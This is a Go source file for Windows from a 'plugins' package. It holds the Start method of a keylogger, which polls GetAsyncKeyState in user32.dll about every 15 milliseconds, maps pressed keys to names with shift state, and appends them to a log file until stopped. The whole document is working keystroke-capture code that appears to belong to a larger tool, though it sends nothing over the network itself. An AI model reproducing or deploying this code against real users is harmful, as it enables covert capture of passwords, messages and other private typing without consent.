//go:build windows

package plugins

import (
	"fmt"
	"os"
	"syscall"
	"time"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

// Start begins polling GetAsyncKeyState and blocks until Stop.
func (k *Keylogger) Start() error {
	if k.logFile == "" {
		return fmt.Errorf("log file path is required")
	}
	k.active = true
	defer func() { k.active = false }()

	shift := func() bool {
		s, _, _ := getAsyncKeyState.Call(vkShift)
		return s&0x8000 != 0
	}

	for {
		select {
		case <-k.stop:
			return nil
		default:
		}
		shifted := shift()
		changed := false
		var sb []byte
		for vk := 0x08; vk <= 0xFE; vk++ {
			state, _, _ := getAsyncKeyState.Call(uintptr(vk))
			pressed := state&0x8000 != 0
			transition := state&0x0001 != 0
			if pressed && (!k.down[vk] || transition) {
				sb = append(sb, []byte(KeyName(vk, shifted))...)
				k.down[vk] = true
				changed = true
			} else if !pressed && k.down[vk] {
				k.down[vk] = false
			}
		}
		if changed {
			f, err := os.OpenFile(k.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
			if err == nil {
				f.Write(sb)
				f.Close()
			}
		}
		time.Sleep(15 * time.Millisecond)
	}
}
